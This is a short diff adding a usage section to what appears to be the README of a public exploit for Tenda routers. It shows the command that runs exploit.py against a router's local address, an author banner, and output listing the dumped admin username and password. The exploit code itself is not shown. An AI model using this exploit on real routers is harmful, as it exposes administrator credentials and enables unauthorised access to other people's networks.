@@ -23,3 +23,22 @@ This exploits allows for the download of the current router config including the
 ⚠️ Telnet activation issue exists in many other tenda devices too.
 
 The configuration exists in the last part of the downloaded firmware image.
+
+
+
+#### Usage:
+```shell
+$ python exploit.py http://192.168.1.1
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/  -- By BenCh@li@h
+|   D _]/\ \  -- github.com/BenChaliah
+ \___/ / /\ \
+      (_ )( _)
+          
+
+[!] Downloading config
+	username: admin
+	password: testpass
+```
